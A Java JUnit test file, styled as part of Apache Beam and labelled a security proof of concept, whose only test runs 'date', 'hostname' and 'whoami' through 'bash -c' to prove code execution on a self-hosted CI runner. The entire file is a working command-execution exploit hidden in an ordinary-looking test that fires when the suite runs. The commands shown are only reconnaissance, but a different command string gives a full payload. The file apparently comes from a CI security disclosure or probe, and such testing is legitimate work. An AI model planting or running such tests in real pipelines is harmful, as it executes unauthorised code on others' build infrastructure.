/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements. See the NOTICE file
 * distributed with this work for additional information.
 */
package org.apache.beam.sdk;

import org.junit.Test;
import java.io.*;

/**
 * Security PoC - demonstrates CI/CD code execution on self-hosted runner.
 * This test only runs 'date' and 'hostname' as harmless proof of RCE.
 */
public class SecurityPoCTest {
    @Test
    public void testRceProof() throws Exception {
        runCommand("date");
        runCommand("hostname");
        runCommand("whoami");
    }

    private void runCommand(String cmd) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", cmd);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        System.out.println("[SECURITY-PoC] === Output of: " + cmd + " ===");
        while ((line = reader.readLine()) != null) {
            System.out.println("[SECURITY-PoC] " + line);
        }
        p.waitFor();
    }
}
